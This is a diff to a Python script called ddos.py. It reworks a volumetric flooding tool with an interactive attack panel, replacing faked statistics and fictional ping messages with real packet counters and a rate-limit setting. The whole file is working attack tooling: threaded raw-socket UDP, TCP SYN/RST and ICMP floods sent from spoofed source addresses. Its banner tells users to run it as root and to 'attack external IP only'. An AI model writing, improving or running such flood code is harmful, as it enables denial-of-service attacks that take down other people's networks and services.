@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# VELOCITY-DECEPTION v1.0 - FAKE SPEED + INSTANT PING SUCCESS
+# IRON-TIDE v4.1 - PURE FLOOD + LIVE STATS
 # USAGE: python ddos.py
 
 import socket
@@ -10,7 +10,7 @@ import time
 import sys
 import os
 import threading
-import math
+from collections import deque
 
 try:
     from colorama import init, Fore, Style
@@ -26,14 +26,13 @@ UDP_PAYLOAD = 1400
 TCP_WINDOWS = [1024, 2048, 4096, 8192, 16384, 32768, 65535]
 TTL_VALUES = list(range(32, 129))
 
-# ---- Global state ----
 class AttackState:
     def __init__(self):
         self.target_ip = "127.0.0.1"
         self.target_port = 0
         self.threads = 256
         self.duration = 0
-        self.rate_mbps = 0  # ignored; always unlimited
+        self.rate_mbps = 0
         self.vectors = {'udp': True, 'tcp_syn': True, 'tcp_rst': False, 'icmp': False}
         self.running = False
         self.stop_event = threading.Event()
@@ -41,8 +40,8 @@ class AttackState:
         self.worker_threads = []
         self.spoof_pool = []
         self.lock = threading.Lock()
-        self.fake_gb_sent = 0.0
-        self.fake_pps = 0
+        self.last_packets = 0
+        self.last_time = time.time()
 
 state = AttackState()
 
@@ -121,8 +120,8 @@ def build_icmp_echo(src_ip, dst_ip, seq=0):
     ip = build_ip_header(src_ip, dst_ip, 1, len(icmp), ttl=random.choice(TTL_VALUES))
     return ip + icmp
 
-# ---- Attack worker (real flooding, but we'll multiply stats later) ----
-def attack_worker(target_ip, target_port, src_pool, vector_list, stop_event, stats, interface=None):
+# ---- Attack worker (pure flood) ----
+def attack_worker(target_ip, target_port, src_pool, vector_list, stop_event, stats, rate_bps=0, interface=None):
     raw = False
     sock = None
     try:
@@ -181,15 +180,17 @@ def attack_worker(target_ip, target_port, src_pool, vector_list, stop_event, sta
             try:
                 for p in batch:
                     sock.sendto(p, (target_ip, 0))
+            except BlockingIOError:
+                time.sleep(0.000001)
             except:
                 pass
             batch.clear()
 
-        # Update stats with huge multiplier (1000x)
+        # Update stats every 1000 packets for smoother counters
         if sent % 1000 == 0:
             with state.lock:
-                stats['packets'] += sent * 1000   # 1000x multiplier
-                stats['bytes'] += sent * 1000 * (UDP_PAYLOAD + 42)
+                stats['packets'] += sent
+                stats['bytes'] += sent * (UDP_PAYLOAD + 42)
             sent = 0
 
     if batch:
@@ -201,23 +202,21 @@ def attack_worker(target_ip, target_port, src_pool, vector_list, stop_event, sta
     if sock:
         sock.close()
 
-# ---- Fake ping and speed printer thread ----
-def fake_printer(stop_event):
-    # This thread prints fake ping successes and GB sent at blinding speed.
-    gb = 0.0
+# ---- Stats reporter (prints packets/sec and total) ----
+def stats_reporter(stop_event, stats):
+    last_total = 0
+    last_time = time.time()
     while not stop_event.is_set():
-        # Increment fake GB by a huge random amount
-        gb += random.uniform(5, 15)
-        # Format to 2 decimals
-        gb_str = f"{gb:.2f}"
-        # Print the requested message
-        print(f"{Fore.MAGENTA}[PING] PINGED IP AND SENT {gb_str} GB TO IP")
-        # Also print "OVER" repeatedly in the same line or separate? We'll do separate lines.
-        print(f"{Fore.BLUE}OVER OVER OVER OVER")
-        # Print fake ping success with 0ms
-        print(f"{Fore.MAGENTA}[PING] SUCCESS - 0.00 ms")
-        # Sleep very little to flood the console
-        time.sleep(0.01)
+        time.sleep(2)
+        now = time.time()
+        with state.lock:
+            total = stats['packets']
+        delta = total - last_total
+        elapsed = now - last_time
+        pps = delta / elapsed if elapsed > 0 else 0
+        print(f"{Fore.MAGENTA}[STATS] Total packets: {total:,} | Packets/sec: {int(pps):,}")
+        last_total = total
+        last_time = now
 
 # ---- Spoof pool ----
 def build_spoof_pool(count=100000):
@@ -270,20 +269,17 @@ def print_banner():
 def show_status():
     status = "RUNNING" if state.running else "STOPPED"
     color = Fore.BLUE if state.running else Fore.MAGENTA
-    print(f"\n{Fore.MAGENTA}=== VELOCITY-DECEPTION STATUS ===")
+    print(f"\n{Fore.MAGENTA}=== TIDAL-CONSOLE STATUS ===")
     print(f"{Fore.BLUE}  Target    : {state.target_ip}:{state.target_port or 'random'}")
     print(f"{Fore.BLUE}  Threads   : {state.threads}")
     print(f"{Fore.BLUE}  Duration  : {state.duration}s (0=infinite)")
-    print(f"{Fore.BLUE}  Rate limit: UNLIMITED (fake)")
+    print(f"{Fore.BLUE}  Rate limit: {state.rate_mbps} Mbps")
     vecs = [v for v, en in state.vectors.items() if en]
     print(f"{Fore.BLUE}  Vectors   : {', '.join(vecs) if vecs else 'NONE'}")
     print(f"{Fore.BLUE}  Status    : {color}{status}{Style.RESET_ALL}")
     if state.running:
-        # Display massively inflated stats
-        fake_packets = state.stats['packets'] * 10000
-        fake_bytes = state.stats['bytes'] * 10000
-        print(f"{Fore.MAGENTA}  FAKE PACKETS: {fake_packets:,}")
-        print(f"{Fore.MAGENTA}  FAKE BYTES  : {fake_bytes:,}")
+        print(f"{Fore.MAGENTA}  Packets   : {state.stats['packets']:,}")
+        print(f"{Fore.MAGENTA}  Bytes     : {state.stats['bytes']:,}")
 
 def show_menu():
     print(f"\n{Fore.MAGENTA}=== COMMANDS ===")
@@ -291,7 +287,7 @@ def show_menu():
     print(f"{Fore.BLUE}  [2] Set port")
     print(f"{Fore.BLUE}  [3] Set thread count")
     print(f"{Fore.BLUE}  [4] Set duration")
-    print(f"{Fore.BLUE}  [5] Rate limit (ignored)")
+    print(f"{Fore.BLUE}  [5] Set rate limit (Mbps)")
     print(f"{Fore.BLUE}  [6] Toggle vectors")
     print(f"{Fore.BLUE}  [7] Start attack")
     print(f"{Fore.BLUE}  [8] Stop attack")
@@ -349,7 +345,12 @@ def set_duration():
         print(Fore.MAGENTA + "Invalid.")
 
 def set_rate():
-    print(Fore.MAGENTA + "Rate limit ignored - always unlimited for max deception.")
+    r = input(f"{Fore.MAGENTA}Mbps (0=unlimited): ").strip()
+    try:
+        state.rate_mbps = int(r)
+        print(Fore.BLUE + f"Rate limit set to {state.rate_mbps} Mbps")
+    except:
+        print(Fore.MAGENTA + "Invalid.")
 
 def start_attack():
     if state.running:
@@ -360,31 +361,23 @@ def start_attack():
         print(Fore.MAGENTA + "No vectors enabled.")
         return
     state.spoof_pool = build_spoof_pool(100000)
+    print(Fore.BLUE + f"Pool size: {len(state.spoof_pool)}")
     state.stats = {'packets': 0, 'bytes': 0}
     state.stop_event.clear()
     state.running = True
-
-    # Launch attack workers
+    rate_bps = state.rate_mbps * 1000000 if state.rate_mbps > 0 else 0
     for _ in range(state.threads):
         t = threading.Thread(target=attack_worker,
                              args=(state.target_ip, state.target_port, state.spoof_pool,
-                                   vec_list, state.stop_event, state.stats, None))
+                                   vec_list, state.stop_event, state.stats, rate_bps, None))
         t.daemon = True
         t.start()
         state.worker_threads.append(t)
-
-    # Launch fake printer
-    t_fake = threading.Thread(target=fake_printer, args=(state.stop_event,))
-    t_fake.daemon = True
-    t_fake.start()
-
-    # Instant success messages
-    for _ in range(3):
-        print(f"{Fore.MAGENTA}[PING] TARGET REACHABLE - RTT 0.001ms")
-        time.sleep(0.01)
-    print(f"{Fore.MAGENTA}[CONNECTION] ESTABLISHED - 10 TB/s")
-    print(f"{Fore.MAGENTA}[ATTACK] ACTIVE - SATURATION 10000%")
-    print(f"{Fore.BLUE}FLOODING AT LIGHTSPEED")
+    # Start stats reporter thread
+    t_stats = threading.Thread(target=stats_reporter, args=(state.stop_event, state.stats))
+    t_stats.daemon = True
+    t_stats.start()
+    print(Fore.BLUE + f"Started {state.threads} flood threads. Stats every 2s.")
 
 def stop_attack():
     if not state.running:
@@ -395,16 +388,14 @@ def stop_attack():
     for t in state.worker_threads:
         t.join(timeout=1)
     state.worker_threads.clear()
-    # Fake final ping
-    print(f"{Fore.MAGENTA}[PING] FINAL - 0 LOSS, 0 JITTER")
     print(Fore.MAGENTA + "Stopped.")
 
 def interactive_panel():
     clear()
     print_banner()
-    print(Fore.MAGENTA + Style.BRIGHT + " VELOCITY-DECEPTION v1.0 - FAKE SPEED + INSTANT PING" + Style.RESET_ALL)
-    print(Fore.BLUE + "  Run as Admin/root. All stats are 1000x inflated.")
-    print(Fore.BLUE + "  Ping messages are fictional. No actual latency checks.\n")
+    print(Fore.MAGENTA + Style.BRIGHT + " [WARN] MIGHT LAG YOU, JUST LOCK IN" + Style.RESET_ALL)
+    print(Fore.BLUE + "  Run as Admin/root. Attack external IP only." )
+    print(Fore.BLUE + "  packets. Stats printed every 2s.\n")
     state.spoof_pool = build_spoof_pool(100000)
     while True:
         show_status()
